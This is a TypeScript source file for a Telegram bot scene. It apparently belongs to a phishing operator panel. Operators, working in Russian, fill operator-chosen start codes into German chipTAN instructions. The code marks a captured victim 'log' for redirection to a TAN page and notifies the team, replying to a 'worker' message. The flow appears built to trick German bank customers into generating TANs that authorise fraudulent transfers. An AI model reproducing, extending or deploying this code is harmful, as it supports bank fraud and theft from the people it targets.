import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {logsRepository} from "@/database";
import {notificationBot} from "@/utils/bot";
import {getUsername} from "@/helpers/getUsername";

export const scene = new Scene<Context>('logRedirectTan')
export const composer = new Composer<Context>()
const regex = /log redirect tan (?<bank>\w+) (?<id>\d+)/gmi
composer.callbackQuery(regex, handler)

async function handler(ctx: Context)  {
    const match = regex.exec(ctx.callbackQuery.data)
    const id = match.groups.id
    const bank = match.groups.bank
    await ctx.scenes.enter('logRedirectTan', {
        id, bank
    })
}

scene.always().callbackQuery('cancel logRedirectTan', async (ctx) => {
    await deleteAllMessages(ctx.session.deleteMessage, ctx)
    ctx.scene.exit()
})

scene.do(async (ctx) => {
    ctx.session.logId = Number(ctx.scene.opts.arg.id)
    ctx.session.bank = ctx.scene.opts.arg.bank
    ctx.session.text =
`
1. Stecken Sie Ihre Chipkarte in den TAN-Generator und wählen Sie "TAN".

2. Geben Sie den Startcode "Значение 1" ein und drücken "OK".

3. Prüfen Sie die Anzeige auf dem Leserdisplay und drücken "OK".

4. Geben Sie "Значение 2" ein und drücken "OK".

5. Geben Sie "Значение 3" ein und drücken "OK".

Bitte geben Sie die auf Ihrem TAN-Generator angezeigte TAN hier ein und bestätigen Sie diese.

`
    const msg = await ctx.reply(`${ctx.session.text}\n➖➖➖➖➖➖➖\n\n<b>Отправьте "Значение 1"</b>`, {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'cancel logRedirectTan')
    })
    ctx.session.deleteMessage = []
    ctx.session.deleteMessage.push(msg.message_id)
})

scene.wait().on("message:text",async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    ctx.session.text = ctx.session.text.replace(/Значение 1/gm, ctx.msg.text)

    const msg = await ctx.reply(`${ctx.session.text}\n➖➖➖➖➖➖➖\n\n<b>Отправьте "Значение 2"</b>`, {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'cancel logRedirectTan')
    })

    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})

scene.wait().on("message:text",async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    ctx.session.text = ctx.session.text.replace(/Значение 2/gm, ctx.msg.text)

    const msg = await ctx.reply(`${ctx.session.text}\n➖➖➖➖➖➖➖\n\n<b>Отправьте "Значение 3"</b>`, {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'cancel logRedirectTan')
    })

    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})

scene.wait().on("message:text",async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    ctx.session.text = ctx.session.text.replace(/Значение 3/gm, ctx.msg.text)

    const msg = await ctx.reply(`${ctx.session.text}`, {
        reply_markup:  new InlineKeyboard()
            .text('Редирект', 'redirect')
            .text('Отмена', 'cancel logRedirectTan')
    })

    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})

scene.wait().on('callback_query:data', async ctx => {
    if (ctx.callbackQuery.data !== 'redirect') return ctx.scene.exit()

    const log = await logsRepository.findOne({
        relations: ['ad', "ad.author", 'ad.acceptedLog'],
        where: {
            id: ctx.session.logId
        }
    })

    log.tanText = ctx.session.text.replaceAll('\n', '<br/>')
    log.redirectTo = 'tan'
    await logsRepository.save(log)

    await deleteAllMessages(ctx.session.deleteMessage, ctx)

    ctx.scene.exit()
    await ctx.answerCallbackQuery({
        text: `
👍 Запрос на редирект "TAN" успешно отправлен
`.replace(`\n`, ''),
        show_alert: true
    })
    return notificationBot.api.sendMessage(log.ad?.author?.tgId, `🔔 ${await getUsername(log.ad.acceptedLog)} Выполнил перевод на TAN`, {
        reply_to_message_id: log.msgWorkerId
    })
})